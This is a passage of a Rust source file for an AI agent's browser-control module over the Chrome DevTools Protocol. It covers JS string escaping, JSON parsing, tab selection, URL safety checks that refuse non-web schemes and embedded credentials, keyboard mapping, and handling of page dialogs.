//! The browser hand: one `LiveHand` over the Chrome DevTools Protocol.
//!
//! Why this one first. Every Electron app is a Chromium that already speaks
//! CDP -- VS Code, Slack, Discord, Figma, Notion, Teams -- as does every
//! browser. One adapter therefore reaches a large slice of the desktop with
//! no per-app plugin anywhere, which is the whole claim the project makes:
//! one core, many hands, and the caller names a document, never a transport.
//!
//! Shape mirrors `hand::Hand`: generic over the stream, so every line except
//! `connect` is tested with no browser and no network, on any OS. A handle is
//! `app:file:unit`, and the three parts mean:
//!   app  - `web`
//!   file - a tab: the name Syn gave it (`tab-5b3f8`, from the browser's own
//!          id for it, so it survives the page changing its title), or, for a
//!          handle written by hand, part of its title or address
//!   unit - a CSS selector naming the region, or `:doc` for the whole page
//! An op's own selector then resolves INSIDE that unit.
//!
//! What a person does, this does. A press is a real mouse press at the
//! middle of the thing, after checking that it is on screen and that
//! nothing is in front of it; typing is real key events; after a press the
//! hand waits for a page that started loading to finish, tells the model
//! where it landed, and says what else happened (a dialog it answered, a tab
//! that opened). `page.js` is the half that runs inside the page.
//!
//! Two things worth knowing before pointing this at a browser:
//!
//! 1. CDP is unauthenticated. Anything that can reach the debugging port
//!    controls the browser completely, including its logged-in sessions.
//!    Syn starts its own browser (`browser.rs`) on a port the system picks
//!    and its own profile, which is what makes that acceptable; a browser
//!    the person points `AGENT_CDP` at is exactly as privileged as it is.
//! 2. Page content is untrusted input. Everything read here comes back as a
//!    `Reply` and goes out through `Runner`, which fences and truncates it,
//!    because a web page is the single most likely place to meet a prompt
//!    injection. Text the person cannot see is not read, and a password or
//!    card field is never read or filled.

use crate::hand::{LiveHand, Reply};
use crate::json::Value;
use crate::ops::{Call, ExportArgs, FormatArgs, ReadArgs, StructArgs, WriteArgs};
use crate::ws::{Deadline, Ws};
use std::collections::{HashMap, HashSet};
use std::io::{Read, Write};
use std::process::Child;
use std::time::{Duration, Instant};

/// The script that runs inside a page: see its own header.
const PAGE_JS: &str = include_str!("page.js");

/// The most a page is given to finish loading before the answer says it is
/// still going. A page that never stops (a long poll, a stream) must not
/// hold a run for ever.
const LOAD_MAX: Duration = Duration::from_secs(20);

/// What a page starts doing in the moment after a press, before the press
/// is judged to have done nothing.
const NAV_LOOK: Duration = Duration::from_millis(350);

/// The verbs this hand answers as `struct` verbs, besides `invoke`. A test
/// holds this to `tools::WEB_VERBS` and to the verbs the schema offers.
pub const VERBS: &[&str] =
    &["goto", "type", "press", "scroll", "hover", "choose", "wait", "back", "forward", "reload", "find", "close"];

// ---------------------------------------------------------------- JSON bits

/// Encode a Rust string as a JavaScript string literal.
///
/// This is the parameter binding of this module, and the reason no selector
/// is ever pasted into source text. A correctly escaped JSON string literal
/// is also a valid JS string literal and cannot terminate itself, so a
/// selector containing quotes or newlines becomes data, never code.
/// U+2028 and U+2029 are escaped as well: JSON permits them raw, but they
/// are line terminators to a JavaScript parser, which is exactly the kind of
/// difference that turns an escaping routine into an injection.
pub fn js_string(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            '\u{2028}' => out.push_str("\\u2028"),
            '\u{2029}' => out.push_str("\\u2029"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

/// Raw slice of a top-level member's value.
///
/// Depth- and string-aware: a `"id"` nested inside `result`, or appearing
/// inside a page's own text, must not be mistaken for the envelope's id.
/// Matching those by substring is the classic way a client pairs a reply
/// with the wrong request under load.
pub fn top_value<'a>(json: &'a str, key: &str) -> Option<&'a str> {
    let b = json.as_bytes();
    let mut i = 0;
    // Enter the outermost object.
    while i < b.len() && b[i] != b'{' {
        i += 1;
    }
    i += 1;
    let mut depth = 0usize;
    while i < b.len() {
        match b[i] {
            b' ' | b'\t' | b'\n' | b'\r' | b',' => i += 1,
            b'"' if depth == 0 => {
                let (name, next) = scan_string(json, i)?;
                let mut j = next;
                while j < b.len() && (b[j] == b' ' || b[j] == b':') {
                    j += 1;
                }
                let end = value_end(json, j)?;
                if name == key {
                    return Some(json[j..end].trim());
                }
                i = end;
            }
            b'{' | b'[' => {
                depth += 1;
                i += 1;
            }
            b'}' | b']' => {
                if depth == 0 {
                    return None;
                }
                depth -= 1;
                i += 1;
            }
            _ => i += 1,
        }
    }
    None
}

/// Scan the JSON string starting at `i` (which must be a quote). Returns the
/// decoded contents and the index just past the closing quote.
fn scan_string(json: &str, i: usize) -> Option<(String, usize)> {
    let b = json.as_bytes();
    if b.get(i) != Some(&b'"') {
        return None;
    }
    let mut out = String::new();
    let mut j = i + 1;
    while j < b.len() {
        match b[j] {
            b'"' => return Some((out, j + 1)),
            b'\\' => {
                j += 1;
                match b.get(j)? {
                    b'n' => out.push('\n'),
                    b'r' => out.push('\r'),
                    b't' => out.push('\t'),
                    b'b' => out.push('\u{8}'),
                    b'f' => out.push('\u{c}'),
                    b'u' => {
                        let hex = json.get(j + 1..j + 5)?;
                        let n = u32::from_str_radix(hex, 16).ok()?;
                        j += 4;
                        // Recombine a surrogate pair, or the page's emoji
                        // arrive as replacement characters.
                        if (0xD800..0xDC00).contains(&n) && json.get(j + 1..j + 3) == Some("\\u") {
                            let lo = u32::from_str_radix(json.get(j + 3..j + 7)?, 16).ok()?;
                            if (0xDC00..0xE000).contains(&lo) {
                                let c = 0x10000 + ((n - 0xD800) << 10) + (lo - 0xDC00);
                                out.push(char::from_u32(c)?);
                                j += 6;
                            } else {
                                out.push('\u{fffd}');
                            }
                        } else {
                            out.push(char::from_u32(n).unwrap_or('\u{fffd}'));
                        }
                    }
                    other => out.push(*other as char),
                }
                j += 1;
            }
            _ => {
                let rest = &json[j..];
                let c = rest.chars().next()?;
                out.push(c);
                j += c.len_utf8();
            }
        }
    }
    None
}

/// Index just past the value starting at `i`.
fn value_end(json: &str, i: usize) -> Option<usize> {
    let b = json.as_bytes();
    match b.get(i)? {
        b'"' => scan_string(json, i).map(|(_, e)| e),
        b'{' | b'[' => {
            let mut depth = 0usize;
            let mut j = i;
            while j < b.len() {
                match b[j] {
                    b'"' => j = scan_string(json, j)?.1,
                    b'{' | b'[' => {
                        depth += 1;
                        j += 1;
                    }
                    b'}' | b']' => {
                        depth -= 1;
                        j += 1;
                        if depth == 0 {
                            return Some(j);
                        }
                    }
                    _ => j += 1,
                }
            }
            None
        }
        _ => {
            let mut j = i;
            while j < b.len() && !matches!(b[j], b',' | b'}' | b']') {
                j += 1;
            }
            Some(j)
        }
    }
}

/// Decoded contents of a top-level member that is a JSON string.
pub fn top_string(json: &str, key: &str) -> Option<String> {
    let raw = top_value(json, key)?;
    scan_string(raw, 0).map(|(s, _)| s)
}

fn jstr(v: &Value, k: &str) -> String {
    v.get(k).and_then(Value::as_str).unwrap_or("").to_string()
}

fn jnum(v: &Value, k: &str) -> f64 {
    match v.get(k) {
        Some(Value::Num(n)) => n.parse().unwrap_or(0.0),
        _ => 0.0,
    }
}

fn jbool(v: &Value, k: &str) -> bool {
    matches!(v.get(k), Some(Value::Bool(true)))
}

fn good(text: impl Into<String>) -> Reply {
    Reply { ok: true, preview: text.into(), error: String::new() }
}

fn bad(text: impl Into<String>) -> Reply {
    Reply { ok: false, preview: String::new(), error: text.into() }
}

// ------------------------------------------------------------------ targets

/// One debuggable target as `/json/list` reports it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Target {
    pub id: String,
    pub kind: String,
    pub title: String,
    pub url: String,
}

/// Parse the `/json/list` array. Objects are split on top-level boundaries
/// rather than by a generic parser, which is all this endpoint needs.
pub fn parse_targets(json: &str) -> Vec<Target> {
    let mut out = Vec::new();
    let b = json.as_bytes();
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'{' {
            let Some(end) = value_end(json, i) else { break };
            let obj = &json[i..end];
            out.push(Target {
                id: top_string(obj, "id").unwrap_or_default(),
                kind: top_string(obj, "type").unwrap_or_default(),
                title: top_string(obj, "title").unwrap_or_default(),
                url: top_string(obj, "url").unwrap_or_default(),
            });
            i = end;
        } else {
            i += 1;
        }
    }
    out
}

/// The name Syn gives a tab: `tab-` and five characters of the browser's own
/// id for it. A page's title changes on every navigation and a handle that
/// found its tab by title stopped matching the moment the page did what a
/// page does; the id does not change for the life of the tab.
pub fn alias_of(id: &str) -> String {
    let h: String = id.chars().filter(char::is_ascii_alphanumeric).take(5).collect();
    format!("tab-{}", h.to_ascii_lowercase())
}

/// Choose the target a handle's `file` part names: by the name Syn gave it
/// or the browser's id, else by part of its title or address.
///
/// Pages are preferred over service workers and extension backgrounds: a
/// title match against an invisible target would silently drive something
/// the human cannot see.
pub fn pick<'a>(targets: &'a [Target], want: &str) -> Option<&'a Target> {
    let w = want.to_lowercase();
    let named = |t: &Target| t.id == want || alias_of(&t.id) == w;
    let hit = |t: &Target| named(t) || t.title.to_lowercase().contains(&w) || t.url.to_lowercase().contains(&w);
    targets
        .iter()
        .find(|t| t.kind == "page" && named(t))
        .or_else(|| targets.iter().find(|t| t.kind == "page" && hit(t)))
        .or_else(|| targets.iter().find(|t| hit(t)))
}

/// The tabs open, as a model reads them: the name to use, the title and the
/// address.
fn tab_list(targets: &[Target]) -> String {
    let pages: Vec<String> = targets
        .iter()
        .filter(|t| t.kind == "page")
        .take(10)
        .map(|t| {
            let title = if t.title.is_empty() { "(no title yet)" } else { t.title.as_str() };
            format!("{} {:?} at {}", alias_of(&t.id), title, t.url)
        })
        .collect();
    if pages.is_empty() { "none".to_string() } else { pages.join("; ") }
}

// ------------------------------------------------------------ addresses

/// What a page may be pointed at. The model chooses addresses, and an
/// address is where a page's own scripts and a person's signed-in sessions
/// meet: so only the web is open to it. `file:` would walk round the
/// workspace folder `open` is held to, `chrome:` and `edge:` are the
/// browser's own settings pages, `javascript:` and `data:` are code and not
/// an address, and an address with a password in it is how a credential
/// ends up in a log. Syn's own console and the browser's control port are
/// loopback addresses a page must never be pointed at: the console takes
/// commands from a page on its own origin.
#[derive(Debug, Clone, Default)]
pub struct Policy {
    pub deny_ports: Vec<u16>,
}

/// Whether `s` starts with `scheme://`, or is one of the schemes written
/// without slashes that a model might try.
pub fn has_scheme(s: &str) -> bool {
    let l = s.trim().to_ascii_lowercase();
    if let Some((scheme, _)) = l.split_once("://")
        && !scheme.is_empty()
        && scheme.chars().all(|c| c.is_ascii_alphanumeric() || "+.-".contains(c))
    {
        return true;
    }
    ["about:", "javascript:", "data:", "blob:", "mailto:", "view-source:", "chrome:", "edge:", "devtools:", "file:"]
        .iter()
        .any(|p| l.starts_with(p))
}

/// Whether bare text reads as an address: `example.com`, `localhost:3000`,
/// `docs.example.org/page`. A title fragment with a space in it is not one.
pub fn host_like(s: &str) -> bool {
    let t = s.trim();
    if t.is_empty() || t.contains(char::is_whitespace) {
        return false;
    }
    let host = t.split(['/', '?', '#']).next().unwrap_or(t);
    let name = host.split(':').next().unwrap_or(host);
    name.eq_ignore_ascii_case("localhost") || (name.contains('.') && !name.starts_with('.') && !name.ends_with('.'))
}

/// The address to load, or the reason it is refused.
pub fn check_url(raw: &str, policy: &Policy) -> Result<String, String> {
    let t = raw.trim().trim_matches(|c| c == '"' || c == '\'' || c == '<' || c == '>');
    if t.is_empty() {
        return Err("give an address to go to, e.g. https://example.com".into());
    }
    if t.contains(char::is_whitespace) {
        return Err(format!("{t:?} is not an address (it has a space in it). Give one like https://example.com/page"));
    }
    let lower = t.to_ascii_lowercase();
    if lower == "about:blank" {
        return Ok("about:blank".into());
    }
    let url = if has_scheme(t) {
        t.to_string()
    } else if host_like(t) {
        let host = t.split(['/', '?', '#']).next().unwrap_or(t);
        let name = host.split(':').next().unwrap_or(host);
        let local = name.eq_ignore_ascii_case("localhost")
            || name.parse::<std::net::Ipv4Addr>().is_ok_and(|ip| ip.is_loopback() || ip.is_private());
        format!("{}://{t}", if local { "http" } else { "https" })
    } else {
        return Err(format!("{t:?} is not an address. Give one like https://example.com"));
    };
    // `javascript:` and `data:` have no slashes: the scheme is what is before
    // the first colon, not before "://".
    let scheme = url.split(':').next().unwrap_or("").to_ascii_lowercase();
    let rest = url.split_once("://").map_or("", |(_, r)| r);
    if scheme != "http" && scheme != "https" {
        let why = match scheme.as_str() {
            "file" => "local files are opened with Excel, Word or PowerPoint, not the browser".to_string(),
            "javascript" | "data" | "blob" => "that is code, not an address".to_string(),
            "chrome" | "edge" | "devtools" | "view-source" | "about" => "the browser's own pages are not for Syn".to_string(),
            other => format!("only http and https addresses are opened, not {other}:"),
        };
        return Err(format!("{t:?} is refused: {why}."));
    }
    let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
    if authority.contains('@') {
        return Err("an address with a user name or password in it is not opened: the person signs in on the page itself".into());
    }
    let (host, port) = match authority.rsplit_once(':') {
        Some((h, p)) if p.chars().all(|c| c.is_ascii_digit()) && !p.is_empty() => (h, p.parse::<u16>().ok()),
        _ => (authority, None),
    };
    let host = host.trim_matches(['[', ']']).to_ascii_lowercase();
    let loopback = host == "localhost" || host == "::1" || host == "0.0.0.0" || host.starts_with("127.");
    if loopback && port.is_some_and(|p| policy.deny_ports.contains(&p)) {
        return Err(format!(
            "{t:?} is refused: that port belongs to Syn itself (its console or the browser's control port), and a page must never be pointed at it"
        ));
    }
    Ok(url)
}

/// Chrome's own words for a page that could not load, in a model's.
fn net_error(code: &str, url: &str) -> String {
    let say = match code {
        "net::ERR_NAME_NOT_RESOLVED" => "that address does not exist (the name could not be looked up)",
        "net::ERR_CONNECTION_REFUSED" => "nothing is listening at that address (connection refused)",
        "net::ERR_CONNECTION_TIMED_OUT" | "net::ERR_TIMED_OUT" => "the site did not answer in time",
        "net::ERR_INTERNET_DISCONNECTED" | "net::ERR_NETWORK_CHANGED" => "there is no internet connection",
        "net::ERR_CONNECTION_RESET" | "net::ERR_CONNECTION_CLOSED" => "the connection was cut off by the site",
        "net::ERR_EMPTY_RESPONSE" => "the site answered with nothing",
        "net::ERR_TOO_MANY_REDIRECTS" => "the site redirects in a circle",
        "net::ERR_BLOCKED_BY_CLIENT" | "net::ERR_BLOCKED_BY_RESPONSE" => "the browser was told not to load it",
        c if c.starts_with("net::ERR_CERT") || c.starts_with("net::ERR_SSL") => "the site's security certificate is not trusted, so the browser refused it",
        _ => "the browser could not load it",
    };
    format!("could not load {url}: {say} ({code}). Check the address, or ask the person if it should be reachable.")
}

// ------------------------------------------------------------------- keys

/// One key as the protocol wants it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Key {
    pub key: String,
    pub code: String,
    pub vk: u32,
    /// What the key types, when it types anything.
    pub text: Option<String>,
}

const MOD_ALT: u32 = 1;
const MOD_CTRL: u32 = 2;
const MOD_META: u32 = 4;
const MOD_SHIFT: u32 = 8;

/// A printable ASCII character as the key that types it on a US keyboard,
/// with the modifiers that key needs: `A` is Shift and `a`, `@` is Shift and
/// `2`, `.` is the period key.
///
/// Every key carries its real virtual-key code. It was once the character's
/// own number, and the period (46) is the Delete key's code: typing an
/// address, `ada@example.test`, came out `ada@exampletest`, the dot taken
/// for a key press that deletes nothing.
pub fn char_key(c: char) -> Option<(u32, Key)> {
    let typed = |key: char, code: &str, vk: u32, shift: bool| {
        (if shift { MOD_SHIFT } else { 0 }, Key { key: key.to_string(), code: code.to_string(), vk, text: Some(key.to_string()) })
    };
    // (unshifted, shifted, code, virtual key): the keys that are not letters
    // or digits, as a US keyboard has them.
    const PUNCT: &[(char, char, &str, u32)] = &[
        ('`', '~', "Backquote", 192),
        ('-', '_', "Minus", 189),
        ('=', '+', "Equal", 187),
        ('[', '{', "BracketLeft", 219),
        (']', '}', "BracketRight", 221),
        ('\\', '|', "Backslash", 220),
        (';', ':', "Semicolon", 186),
        ('\'', '"', "Quote", 222),
        (',', '<', "Comma", 188),
        ('.', '>', "Period", 190),
        ('/', '?', "Slash", 191),
    ];
    // The characters over the digits, by the digit they share a key with.
    const OVER_DIGITS: &[(char, u32)] = &[('!', 1), ('@', 2), ('#', 3), ('$', 4), ('%', 5), ('^', 6), ('&', 7), ('*', 8), ('(', 9), (')', 0)];
    Some(match c {
        'a'..='z' => typed(c, &format!("Key{}", c.to_ascii_uppercase()), c.to_ascii_uppercase() as u32, false),
        'A'..='Z' => typed(c, &format!("Key{c}"), c as u32, true),
        '0'..='9' => typed(c, &format!("Digit{c}"), c as u32, false),
        ' ' => typed(' ', "Space", 32, false),
        _ => {
            if let Some(&(plain, _, code, vk)) = PUNCT.iter().find(|(u, s, _, _)| *u == c || *s == c) {
                typed(c, code, vk, c != plain)
            } else if let Some(&(_, d)) = OVER_DIGITS.iter().find(|(ch, _)| *ch == c) {
                typed(c, &format!("Digit{d}"), 48 + d, true)
            } else {
                return None;
            }
        }
    })
}

/// `Enter`, `Control+a`, `Shift+Tab`, `ArrowDown`, `F5`: the modifiers as a
/// bitmask and the key.
pub fn parse_key(spec: &str) -> Result<(u32, Key), String> {
    let spec = spec.trim();
    if spec.is_empty() {
        return Err("press: say which key, e.g. Enter, Tab, Escape, ArrowDown or Control+a".into());
    }
    // "+" alone, or "Control++", is the plus key; otherwise the last part
    // after a "+" is the key and what comes before it is the modifiers.
    let (mod_text, last): (&str, &str) = if spec == "+" {
        ("", "+")
    } else if let Some(mods) = spec.strip_suffix("++") {
        (mods, "+")
    } else {
        spec.rsplit_once('+').unwrap_or(("", spec))
    };
    let mods: Vec<&str> = mod_text.split('+').map(str::trim).filter(|p| !p.is_empty()).collect();
    let last = last.trim();
    let mut m = 0;
    for p in &mods {
        m |= match p.to_ascii_lowercase().as_str() {
            "control" | "ctrl" => MOD_CTRL,
            "shift" => MOD_SHIFT,
            "alt" | "option" => MOD_ALT,
            "meta" | "cmd" | "command" | "win" | "windows" => MOD_META,
            other => return Err(format!("press: {other:?} is not a modifier. Use Control, Shift, Alt or Meta, as in Control+a")),
        };
    }
    let named = |key: &str, code: &str, vk: u32, text: Option<&str>| Key { key: key.into(), code: code.into(), vk, text: text.map(str::to_string) };
    let lower = last.to_ascii_lowercase();
    let key = match lower.as_str() {
        "enter" | "return" => named("Enter", "Enter", 13, Some("\r")),
        "tab" => named("Tab", "Tab", 9, None),
        "escape" | "esc" => named("Escape", "Escape", 27, None),
        "backspace" => named("Backspace", "Backspace", 8, None),
        "delete" | "del" => named("Delete", "Delete", 46, None),
        "space" | "spacebar" => named(" ", "Space", 32, Some(" ")),
        "arrowup" | "up" => named("ArrowUp", "ArrowUp", 38, None),
        "arrowdown" | "down" => named("ArrowDown", "ArrowDown", 40, None),
        "arrowleft" | "left" => named("ArrowLeft", "ArrowLeft", 37, None),
        "arrowright" | "right" => named("ArrowRight", "ArrowRight", 39, None),
        "home" => named("Home", "Home", 36, None),
        "end" => named("End", "End", 35, None),
        "pageup" | "pgup" => named("PageUp", "PageUp", 33, None),
        "pagedown" | "pgdn" | "pgdown" => named("PageDown", "PageDown", 34, None),
        f if f.len() >= 2 && f.starts_with('f') && f[1..].parse::<u32>().is_ok_and(|n| (1..=12).contains(&n)) => {
            let n: u32 = f[1..].parse().unwrap();
            named(&format!("F{n}"), &format!("F{n}"), 111 + n, None)
        }
        _ => {
            let mut chars = last.chars();
            let one = match (chars.next(), chars.next()) {
                (Some(c), None) => Some(c),
                _ => None,
            };
            // With Shift held a letter is the capital one.
            let one = one.map(|c| if m & MOD_SHIFT != 0 && c.is_ascii_lowercase() { c.to_ascii_uppercase() } else { c });
            match one.and_then(char_key) {
                Some((needs, key)) => {
                    m |= needs;
                    key
                }
                None => return Err(format!("press: {last:?} is not a key I know. Use Enter, Tab, Escape, Backspace, Delete, Space, an arrow, Home, End, PageUp, PageDown, F1 to F12, or one character; Control+a for a shortcut")),
            }
        }
    };
    // A shortcut types nothing: Control+a selects, it does not insert an "a".
    let key = if m & (MOD_CTRL | MOD_ALT | MOD_META) != 0 { Key { text: None, ..key } } else { key };
    Ok((m, key))
}

// ---------------------------------------------------------- the page script

/// A script that runs `expr` from `page.js` in the page and returns what it
/// returned as JSON text. The unit of the handle is the element it works
/// inside (`:doc` is the whole page); a throw comes back as `{threw: ...}`.
pub fn page_script(unit: &str, expr: &str) -> String {
    let base = if unit.is_empty() || unit == ":doc" { "document".to_string() } else { format!("document.querySelector({})", js_string(unit)) };
    format!(
        "(function(){{{PAGE_JS}\nvar u={base};if(!u)return JSON.stringify({{threw:\"unit not found: \"+{uq}}});S.base=u;\
         try{{return JSON.stringify({expr});}}catch(e){{return JSON.stringify({{threw:String(e&&e.message||e)}});}}}})()",
        uq = js_string(unit),
    )
}

/// Join a grid the way a page reads best: tabs across, newlines down.
fn text_of(values: &[Vec<String>]) -> String {
    values.iter().map(|r| r.join("\t")).collect::<Vec<_>>().join("\n")
}

/// `body@4000`: the selector and the character to start reading at. Only an
/// `@` followed by digits and nothing else counts, because `@` is legal
/// inside an attribute selector.
pub fn split_offset(sel: &str) -> (&str, usize) {
    if let Some((head, tail)) = sel.rsplit_once('@')
        && !head.is_empty()
        && !tail.is_empty()
        && tail.chars().all(|c| c.is_ascii_digit())
        && let Ok(n) = tail.parse()
    {
        return (head, n);
    }
    (sel, 0)
}

fn arg<'a>(args: &'a [(String, String)], k: &str) -> &'a str {
    args.iter().find(|(n, _)| n == k).map(|(_, v)| v.as_str()).unwrap_or("")
}

/// Whether this hand does the call at all, before anything is sent to a
/// browser. A page has no undo stack this hand can honour --
/// `document.execCommand("undo")` only does anything in an editable context
/// and silently reports success elsewhere, which would let a caller believe
/// an edit was rolled back when it was not -- and it does not write files.
fn supported(call: &Call) -> Result<(), String> {
    match call {
        Call::Read(_) | Call::Write(_) | Call::Format(_) => Ok(()),
        Call::Undo => Err("Undo is not supported by the cdp hand: a page has no undo this hand can honour. Reload it, or go back, instead".into()),
        Call::Export(ExportArgs { format, path, .. }) => match (format.as_str(), path.is_some()) {
            ("png" | "pdf", true) | ("title" | "text" | "html" | "summary" | "preview", false) => Ok(()),
            ("png" | "pdf", false) => Err(format!("export {format} needs a path to save the file at")),
            ("title" | "text" | "html" | "summary" | "preview", true) => {
                Err("Export to a file is only png and pdf here; a page's text comes back as the answer, with no path".into())
            }
            (f, _) => Err(format!("Export {f:?} is not supported by the cdp hand: use text, html, title or summary, or png or pdf with a path")),
        },
        Call::Struct(StructArgs::Invoke { action, .. }) => match action.as_str() {
            "invoke" | "click" | "toggle" | "select" | "focus" => Ok(()),
            other => Err(format!("{other:?} is not an action on a web page. Use click, focus or toggle (or a verb: type, press, scroll, hover, choose)")),
        },
        Call::Struct(StructArgs::Office { verb, .. }) if VERBS.contains(&verb.as_str()) => Ok(()),
        Call::Struct(StructArgs::Office { verb, .. }) => Err(format!("{verb} is not something a web page has. A page takes: {}, invoke", VERBS.join(", "))),
        Call::Struct(_) => Err("Struct is not supported by the cdp hand for that verb. A page takes: goto, type, press, scroll, hover, choose, wait, back, forward, reload, find, close, invoke".into()),
    }
}

// ------------------------------------------------------------------ session

/// What a page said about itself a moment ago, kept to tell what an action
/// changed.
#[derive(Debug, Clone, Default, PartialEq)]
struct Snap {
    title: String,
    url: String,
    status: u32,
}

/// A connected CDP hand: one browser, many targets, many handles.
#[derive(Debug)]
pub struct Cdp<S: Read + Write + Deadline> {
    ws: Ws<S>,
    targets: Vec<Target>,
    /// targetId -> sessionId, so a second op on the same page is one call.
    sessions: HashMap<String, String>,
    next_id: u64,
    calls: u64,
    /// Tabs Syn made, which are the only ones `close` will close: a tab the
    /// person had open is theirs.
    opened: HashSet<String>,
    /// session -> the frames of that page that are loading now.
    loading: HashMap<String, HashSet<String>>,
    /// Things that happened beside the call (a dialog answered, a tab that
    /// opened), said with its result.
    notes: Vec<String>,
    /// The tab in front, as far as this hand knows. Chrome runs a tab it is
    /// not showing at a crawl (timers throttled, no frames, nothing that
    /// waits to be scrolled into view loads), and a link that opens a tab puts
    /// that one in front: so the page Syn goes on driving stopped behaving, and
    /// a screenshot of it could not be taken. Before a call on a tab, it is
    /// brought forward, and only when it is not already.
    active: Option<String>,
    /// The field `type` last wrote into, as (tab session, the selector it was
    /// given), until the next call that is not a key press. A page that
    /// completes as you type may replace that field with a new one, and the
    /// key that follows (Enter to search) is then aimed at a selector that no
    /// longer exists though the person can see exactly what is meant.
    typed: Option<(String, String)>,
    /// The browser, when Syn started it: ended with this hand.
    child: Option<Child>,
    /// How long it is given to close by itself before it is told.
    grace: Duration,
    policy: Policy,
}

fn other(msg: String) -> std::io::Error {
    std::io::Error::other(msg)
}

impl<S: Read + Write + Deadline> Cdp<S> {
    pub fn new(ws: Ws<S>, targets: Vec<Target>) -> Self {
        Self {
            ws,
            targets,
            sessions: HashMap::new(),
            next_id: 0,
            calls: 0,
            opened: HashSet::new(),
            loading: HashMap::new(),
            notes: Vec::new(),
            active: None,
            typed: None,
            child: None,
            // A browser closes in about a second, but Edge was measured taking
            // 5 s after a page that did not resolve, and a browser told at 4 s
            // had not yet written the cookie of a sign-in made a moment before.
            // The console waits a little longer than this for its CLI.
            grace: Duration::from_secs(10),
            policy: Policy::default(),
        }
    }

    pub fn calls(&self) -> u64 {
        self.calls
    }

    pub fn targets(&self) -> &[Target] {
        &self.targets
    }

    /// The browser Syn started is this hand's to end.
    pub fn own(&mut self, child: Child) {
        self.child = Some(child);
    }

    pub fn set_policy(&mut self, policy: Policy) {
        self.policy = policy;
    }

    /// Ask the browser to tell us when tabs come and go, so the list this
    /// hand holds stays what the browser has.
    pub fn watch_targets(&mut self) {
        let _ = self.call("Target.setDiscoverTargets", "{\"discover\":true}", None);
    }

    /// The target a handle names, asking the browser again when the list
    /// this hand holds has nothing that matches.
    ///
    /// The list was taken once, at connect, and never again. Syn connects
    /// to a running browser before every turn, so it held whatever tabs
    /// existed then -- in a live run, one tab whose page had not loaded yet
    /// and so had no title. Opening "Syn CDP testbed" succeeded and every
    /// call after it failed with `open targets: [""]`. A tab opened,
    /// navigated or renamed after Syn connected was out of reach the same
    /// way. The browser is asked over the socket already open, not by a
    /// new HTTP request, and only on a miss, so a call that matches costs
    /// what it always did.
    fn target_for(&mut self, want: &str) -> std::io::Result<Option<Target>> {
        if let Some(t) = pick(&self.targets, want) {
            return Ok(Some(t.clone()));
        }
        self.refresh_targets()?;
        Ok(pick(&self.targets, want).cloned())
    }

    /// Replace the target list with the browser's own, now.
    fn refresh_targets(&mut self) -> std::io::Result<()> {
        let reply = self.call("Target.getTargets", "{}", None)?;
        let parsed = crate::json::parse(&reply).map_err(|e| other(format!("Target.getTargets: {e}")))?;
        let Some(Value::Arr(infos)) = parsed.get("result").and_then(|r| r.get("targetInfos")) else {
            return Err(other(format!("Target.getTargets answered without targetInfos: {reply}")));
        };
        self.targets = infos.iter().map(info_target).collect();
        Ok(())
    }

    fn send_raw(&mut self, method: &str, params: &str, session: Option<&str>) -> std::io::Result<u64> {
        self.next_id += 1;
        let id = self.next_id;
        let sess = match session {
            Some(s) => format!(",\"sessionId\":{}", js_string(s)),
            None => String::new(),
        };
        let msg = format!("{{\"id\":{id},\"method\":{},\"params\":{params}{sess}}}", js_string(method));
        self.ws.send_text(&msg)?;
        self.calls += 1;
        Ok(id)
    }

    /// Send one command and return the matching reply.
    ///
    /// Events arrive interleaved with replies on the same socket. They are
    /// told from replies by shape (an event has a `method` and no `id`) and
    /// acted on as they come, which is what lets a dialog that a page opened
    /// in the middle of this very call be answered: until it is, the call
    /// never returns.
    pub fn call(&mut self, method: &str, params: &str, session: Option<&str>) -> std::io::Result<String> {
        let id = self.send_raw(method, params, session)?;
        for _ in 0..4096 {
            let got = self.ws.recv_text()?;
            match top_value(&got, "id").and_then(|v| v.trim().parse::<u64>().ok()) {
                Some(n) if n == id => {
                    if let Some(e) = top_value(&got, "error") {
                        let m = top_string(e, "message").unwrap_or_else(|| e.to_string());
                        return Err(other(format!("cdp {method} failed: {m}")));
                    }
                    return Ok(got);
                }
                // The answer to something sent from `on_event`.
                Some(_) => {}
                None => self.on_event(&got),
            }
        }
        Err(other(format!("no reply to {method} after 4096 messages")))
    }

    /// What the page and the browser say on their own.
    fn on_event(&mut self, msg: &str) {
        let Some(method) = top_string(msg, "method") else { return };
        let params = top_value(msg, "params").unwrap_or("{}");
        let session = top_string(msg, "sessionId");
        match method.as_str() {
            "Page.javascriptDialogOpening" => {
                let kind = top_string(params, "type").unwrap_or_default();
                let said = top_string(params, "message").unwrap_or_default();
                // An alert has one answer, and a page about to be left is
                // left. A question (confirm, prompt) is the person's to
                // answer, so it is refused and the model is told what was
                // asked.
                let accept = matches!(kind.as_str(), "alert" | "beforeunload");
                let _ = self.send_raw("Page.handleJavaScriptDialog", &format!("{{\"accept\":{accept}}}"), session.as_deref());
                let said: String = said.chars().take(200).collect();
                self.notes.push(if accept {
                    format!("a {kind} dialog appeared and said {said:?}; Syn closed it")
                } else {
                    format!("a {kind} dialog appeared and asked {said:?}; Syn answered Cancel, because that is the person's to decide. If they want it confirmed, ask them, then repeat the step")
                });
            }
            "Page.frameStartedLoading" | "Page.frameRequestedNavigation" => {
                if let (Some(s), Some(f)) = (session, top_string(params, "frameId")) {
                    self.loading.entry(s).or_default().insert(f);
                }
            }
            "Page.frameStoppedLoading" | "Page.frameDetached" => {
                if let (Some(s), Some(f)) = (session, top_string(params, "frameId")) {
                    self.loading.entry(s).or_default().remove(&f);
                }
            }
            "Target.targetCreated" | "Target.targetInfoChanged" => {
                if let Some(info) = top_value(params, "targetInfo") {
                    let t = Target {
                        id: top_string(info, "targetId").unwrap_or_default(),
                        kind: top_string(info, "type").unwrap_or_default(),
                        title: top_string(info, "title").unwrap_or_default(),
                        url: top_string(info, "url").unwrap_or_default(),
                    };
                    let fresh = !self.targets.iter().any(|x| x.id == t.id);
